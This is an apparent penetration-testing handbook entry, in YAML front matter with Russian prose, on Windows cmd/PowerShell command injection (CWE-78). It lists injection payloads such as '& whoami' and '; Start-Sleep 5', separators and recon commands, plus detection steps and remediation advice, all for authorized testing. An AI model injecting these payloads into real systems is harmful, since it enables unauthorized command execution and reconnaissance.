---
id: cmdi-windows-specific
title: "Command injection: Windows cmd/PowerShell"
type: cmdi
target: windows
category: web
difficulty: intermediate
bypass: none
tags: [cmdi, windows, powershell]
tested_on: ["Windows Server 2019 cmd", "PowerShell 5.1"]
success_rate: 0.5
risk: high
cwe: "CWE-78"
lab: null
last_verified: "2026-10-23"
references:
  - "https://owasp.org/www-community/attacks/Command_Injection"
graph:
  - target: "cmdi"
    type: instance_of
  - target: "active-directory"
    type: related_to
  - target: "rce"
    type: leads_to
---

# Command injection: Windows cmd/PowerShell

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
& whoami
```

## Explanation

В Windows набор разделителей другой: `&`, `&&`, `|`, а также перевод строки.
Полезные диагностические команды: `whoami`, `hostname`, `ipconfig /all`,
`net user`, `systeminfo`, `type C:\Windows\win.ini`.
В PowerShell-контексте (`powershell -c`) работают `;`, `$(...)`, backtick как escape-символ,
а `Invoke-Expression` выполняет произвольную строку.
Задержка: `ping -n 6 127.0.0.1` (cmd) или `Start-Sleep 5` (PowerShell).

## Detection

1. `& whoami` и `| whoami` — сравните ответы.
2. Задержка через `ping -n 6 127.0.0.1`.
3. Признак Windows-контекста: пути `C:\`, ошибки `is not recognized as an internal or external command`.

## Remediation

- Не конкатенировать пользовательские данные в `cmd /c` или `powershell -Command`.
- Использовать API напрямую вместо вызова утилит.
- Запуск сервисов под низкопривилегированными учётками (не `LocalSystem`).
- AppLocker/WDAC + PowerShell Constrained Language Mode.
- Аудит Event ID 4688 (создание процессов) с командной строкой.

## Variants

```
&& whoami
```

```
| whoami
```

```
& ping -n 6 127.0.0.1
```

```
; Start-Sleep 5
```
